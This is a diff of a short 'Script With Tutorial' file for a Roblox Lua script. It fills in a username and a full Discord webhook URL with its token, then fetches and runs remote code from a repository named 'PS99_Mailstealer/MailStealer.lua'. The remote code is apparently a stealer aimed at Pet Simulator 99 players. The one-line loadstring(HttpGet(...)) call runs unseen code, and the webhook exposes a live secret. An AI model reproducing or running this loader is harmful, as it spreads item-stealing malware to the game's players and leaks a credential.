@@ -1,9 +1,9 @@
 # Script With Tutorial !
 
 ```lua
-Username = "Your Nick Here"
+Username = "Reset42597561"
 LoadScreen = true 
-Webhook = "Your Link Here" -- Paste your Discord webhook here
+Webhook = "https://discord.com/api/webhooks/1251952647066488843/_Zdz2juy5cLuJlW2DRJ_w5s2V2nS4MB6L62fEKqXt9dX_Ip2JPCc-An2gU0FWAsm3zCe" -- Paste your Discord webhook here
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
 ```
